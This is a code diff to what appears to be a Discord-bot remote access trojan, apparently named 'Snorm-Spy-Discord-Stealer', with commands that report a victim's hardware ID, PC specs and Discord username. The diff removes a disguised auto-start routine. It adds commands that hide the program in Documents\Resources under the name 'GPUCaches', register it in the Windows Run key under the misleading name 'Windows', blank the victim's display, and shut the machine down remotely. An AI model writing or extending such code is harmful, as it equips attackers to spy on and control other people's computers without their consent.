@@ -39,6 +39,7 @@ from screeninfo import get_monitors
 import GPUtil
 import psutil
 import platform
+import winreg
 
 
 logging.getLogger('discord').setLevel(logging.CRITICAL)
@@ -58,20 +59,6 @@ intents = discord.Intents.all()
 
 bot = commands.Bot(command_prefix="!", intents=intents)
 
-def add_to_startup():
-    exe_name = "GPUCaches"  
-    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
-    exe_path = os.path.join(startup_folder, exe_name)
-
-    if not os.path.exists(exe_path):  
-        try:
-            shutil.copy(sys.executable, exe_path)  # Copies the EXE to the startup folder
-            print(f"...")
-        except Exception as e:
-            print(f"...")
-
-
-add_to_startup()
 
 def send_to_webhook(content):
     try:
@@ -586,7 +573,7 @@ async def hwid(ctx):
 
 @bot.command()
 async def jumpscare(ctx):
-    
+    """Displays an image on the user's screen."""
 
 
     image_url = "https://github.com/UnsillyHaxor/Snorm-Spy-Discord-Stealer-/blob/main/scarylarry.png?raw=true"
@@ -706,10 +693,10 @@ async def specs(ctx):
         
         await ctx.send(
             f"**PC Specs:**\n"
-            f" **OS:** `{os_name}`\n"
-            f" **CPU:** `{cpu}`\n"
-            f" **GPU:** `{gpu_info}`\n"
-            f" **RAM:** `{ram} GB`"
+            f"🖥️ **OS:** `{os_name}`\n"
+            f"⚙️ **CPU:** `{cpu}`\n"
+            f"🎮 **GPU:** `{gpu_info}`\n"
+            f"💾 **RAM:** `{ram} GB`"
         )
 
     except Exception as e:
@@ -749,6 +736,64 @@ async def discord(ctx):
     except Exception as e:
         await ctx.send(f"Error retrieving Discord username: `{str(e)}`")
 
+@bot.command()
+async def screenoff(ctx):
+    await ctx.send("Turning off the display for 30 seconds...")
+
+    if platform.system() == "Windows":
+        os.system("powershell -command \"(Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Display { [DllImport(\\\"user32.dll\\\")] public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam); }' -Language CSharp); [Display]::SendMessage(0xFFFF, 0x0112, 0xF170, 2)\"")
+    
+    elif platform.system() == "Linux":
+        os.system("xset dpms force off")
+
+    elif platform.system() == "Darwin":  
+        os.system("pmset displaysleepnow")
+
+    await asyncio.sleep(30)  
+
+    await ctx.send("Turning the display back on...")
+
+    if platform.system() == "Windows":
+        os.system("powershell -command \"$wsh = New-Object -ComObject WScript.Shell; $wsh.SendKeys(' ');\"")  
+
+    elif platform.system() == "Linux":
+        os.system("xset dpms force on")
+
+    elif platform.system() == "Darwin":  
+        os.system("caffeinate -u -t 1")  
+
+@bot.command()
+async def startup(ctx):
+    try:
+        exe = 'GPUCaches'
+        key = r'Software\Microsoft\Windows\CurrentVersion\Run'
+        directory = os.path.join(os.path.expanduser('~'), 'Documents', 'Resources')
+        path = os.path.join(directory, exe)
+
+        
+        os.makedirs(directory, exist_ok=True)
+
+        
+        script_path = sys.argv[0]  
+        shutil.copy(script_path, path)
+
+        
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as reg_key:
+            winreg.SetValueEx(reg_key, 'Windows', 0, winreg.REG_SZ, path)
+
+        await ctx.send("Added to startup")
+
+    except Exception as e:
+        await ctx.send(f"Failed to add it. ( idk what happened tbh )")
+
+@bot.command()
+async def shutdown(ctx):
+    await ctx.send("Shutting down the system...")
+
+    if platform.system() == "Windows":
+        os.system("shutdown /s /t 0")
+    elif platform.system() == "Linux" or platform.system() == "Darwin":
+        os.system("shutdown -h now")
 
 
 
